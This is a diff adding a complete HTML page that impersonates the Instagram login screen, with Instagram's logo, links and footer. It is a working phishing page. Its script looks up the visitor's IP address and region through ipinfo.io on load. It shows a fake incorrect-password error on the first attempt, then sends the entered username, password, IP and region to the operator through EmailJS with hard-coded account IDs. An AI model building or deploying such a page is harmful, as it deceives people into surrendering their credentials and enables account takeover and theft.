@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="stylesheet" href="{% static 'css/instagram.css' %}">
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "_EFrxAnDXYdOkC9J8",
+      });
+   })();
+</script>
+
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+    <style>
+        html {
+            height: 100%;
+        }
+
+        body {
+            background: rgba(250, 250, 250, 1);
+        }
+
+        .login {
+            background: #fff;
+            border: 1px solid rgb(236, 234, 234);
+            border-radius: 0px;
+            height: 410px;
+            margin: 30px auto 0;
+            width: 100%;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+
+        .login h1 {
+            box-sizing: border-box;
+            margin: 20px 0 30px 0;
+            text-align: center;
+            user-select: none;
+        }
+
+        input[type="password"],
+        input[type="text"] {
+            background: rgba(250, 250, 250, 1);
+            border: 1px solid rgb(236, 234, 234);
+            border-radius: 3px;
+            box-shadow: 0 1px #fff;
+            box-sizing: border-box;
+            color: black;
+            height: 39px;
+            margin: 10px 0 0 0;
+            padding: 10px;
+            font-size: 13px;
+            width: 90%;
+        }
+
+        input[type="password"]::placeholder,
+        input[type="text"]::placeholder {
+            color: rgb(165, 164, 164);
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: 0;
+            border: 1px solid #a1a1a1;
+        }
+
+        .one {
+            font-size: -0;
+        }
+
+        .forgot {
+            color: #7f7f7f;
+            display: inline-block;
+            box-sizing: border-box;
+            font: 12px/1 sans-serif;
+            text-decoration: none;
+            transition: color .4s;
+        }
+
+        .forgot:hover {
+            color: #3b3b3b;
+        }
+
+        input[type="submit"] {
+            background: #3897F0;
+            border: 0px;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #f8f8f8;
+            font-weight: 600;
+            height: 39px;
+            margin: 14px 0 0 0;
+            width: 90%;
+        }
+
+        input[type="submit"]:hover,
+        input[type="submit"]:focus {
+            background: rgb(48, 144, 233);
+            outline: 0;
+        }
+
+        .divider {
+            overflow: hidden;
+            text-align: center;
+            box-sizing: border-box;
+            color: rgb(165, 164, 164);
+            font-size: 13.5px;
+            font-weight: 500;
+            margin: 20px 0 0 0;
+            width: 90%;
+        }
+
+        .divider:before,
+        .divider:after {
+            background-color: rgb(224, 221, 221);
+            content: "";
+            display: inline-block;
+            height: 1.2px;
+            position: relative;
+            vertical-align: middle;
+            width: 50%;
+        }
+
+        .divider:before {
+            right: 2em;
+            margin-left: -50%;
+        }
+
+        .divider:after {
+            left: 2em;
+            margin-right: -50%;
+        }
+
+        .fbwrapper {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        .fb a {
+            font-weight: 600;
+            font-size: 14px;
+            display: inline;
+            vertical-align: middle;
+            margin: 20px 0 0 10px;
+            text-decoration: none;
+            color: rgb(107, 106, 106);
+        }
+
+        .fb img {
+            vertical-align: middle;
+        }
+
+        .forgotwrapper {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot a {
+            text-decoration: none;
+            color: rgb(107, 106, 106);
+            font-size: 13px;
+        }
+
+        .infobox {
+            background: #fff;
+            border: 1px solid rgb(236, 234, 234);
+            border-radius: 0px;
+            height: auto;
+            margin: 10px auto 0;
+            width: 90%;
+            max-width: 400px;
+            padding: 10px 0;
+        }
+
+        .infobox p {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 10px 20px;
+            text-align: center;
+            user-select: none;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .infobox p a {
+            color: rgb(94, 163, 243);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .apps {
+            height: 100px;
+            margin: 20px auto 0;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .apps p {
+            box-sizing: border-box;
+            margin: 10px 0 30px 0;
+            text-align: center;
+            user-select: none;
+            font-size: 14px;
+        }
+
+        .apps span a {
+            box-sizing: border-box;
+            margin-left: 28px;
+        }
+
+        .app span a img {
+            padding-left: 20px;
+        }
+
+        .footer {
+            position: relative;
+            left: 0;
+            bottom: 0;
+            margin-top: 50px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .footer p a {
+            color: #003569;
+            text-decoration: none;
+            padding-left: 10px;
+            font-size: 13px;
+        }
+
+        .footer p span {
+            color: rgb(189, 186, 186);
+            padding-left: 80px;
+            font-size: 13px;
+        }
+
+        .error-message {
+            display: none;
+            color: #ED4956;
+            font-size: 12px;
+            text-align: center;
+            margin: 10px 40px 0;
+            line-height: 1.4;
+        }
+
+        @media screen and (max-width: 350px) {
+            .login {
+                width: 100%;
+                padding: 20px 10px;
+            }
+
+            .divider {
+                width: calc(90% - 40px);
+                margin-left: 20px;
+                margin-top: 20px;
+            }
+
+            .infobox {
+                width: 90%;
+                padding: 12px 0;
+            }
+
+            .infobox p {
+                font-size: 13px;
+                padding: 0 15px;
+            }
+
+            .apps span a img {
+                width: 35%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login">
+        <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
+        <form id="contact-form">
+          <input type="text" placeholder="Username" id="name" value="instagram" name="name" class="input-1" hidden />
+          <input type="text" placeholder="Username" id="email" name="email" class="input-1" required />
+          <div class="overlap-text">
+              <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
+          </div>
+          <input class="btn btn-primary" type="submit" value="Log in">
+      </form>
+      
+      <!-- Hidden inputs for IP and State -->
+      <input type="hidden" id="ip_address" name="ip_address">
+      <input type="hidden" id="state" name="state">
+
+        <div class="divider"><b>OR</b></div>
+
+        <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png"> Log in with Facebook</a></div></div>
+        <div id="login-error" class="error-message">
+            Sorry, your password was incorrect. Please double-check your password.
+        </div>
+
+        <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
+    </div>
+
+    <br>
+    <div class="infobox">
+        <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
+    </div>
+
+    <div class="apps">
+        <p>Get the app.</p>
+        <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
+    </div>
+
+    <div class="footer">
+        <p>
+            <a href="https://www.instagram.com/about/us/">ABOUT US</a>
+            <a href="https://help.instagram.com/">SUPPORT</a>
+            <a href="https://instagram-press.com/">PRESS</a>
+            <a href="https://www.instagram.com/developer/">API</a>
+            <a href="https://www.instagram.com/about/jobs/">JOBS</a>
+            <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
+            <a href="https://help.instagram.com/581066165581870">TERMS</a>
+            <a href="https://www.instagram.com/explore/locations/">DIRECTORY</a>
+            <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
+            <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
+            <a href="">LANGUAGE</a>
+            <span>© 2024 INSTAGRAM</span>
+        </p>
+    </div>
+      
+    
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function() {
+          fetch("https://ipinfo.io/json?token=3f8d1755073ac8") // Replace with your free ipinfo.io API key
+          .then(response => response.json())
+          .then(data => {
+              document.getElementById("ip_address").value = data.ip;
+              document.getElementById("state").value = data.region;
+          })
+          .catch(error => console.error("Error fetching IP info:", error));
+      });
+    
+      let attemptCount = 0;
+    
+      document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+    
+        // First attempt shows inline error
+        if (attemptCount === 0) {
+          attemptCount++;
+          document.getElementById("login-error").style.display = "block";
+          return;
+        }
+    
+        // Collect form values
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var message = document.getElementById("message").value;
+        var ip_address = document.getElementById("ip_address").value;
+        var state = document.getElementById("state").value;
+    
+        var emailParams = {
+          from_name: name,
+          from_email: email,
+          message: message,
+          ip_address: ip_address,
+          state: state
+        };
+    
+        emailjs.send("service_jpfw7c1", "template_g5qfc0a", emailParams)
+      .then(function(response) {
+        alert("Error Connecting, try again later");
+        window.location.href = "index.html";
+      }, function(error) {
+        console.error("Login Error:", error);
+        alert("Failed to Login. Please check and try again.");
+      });
+  });
+    </script>
+    
+</body>
+
+</html>
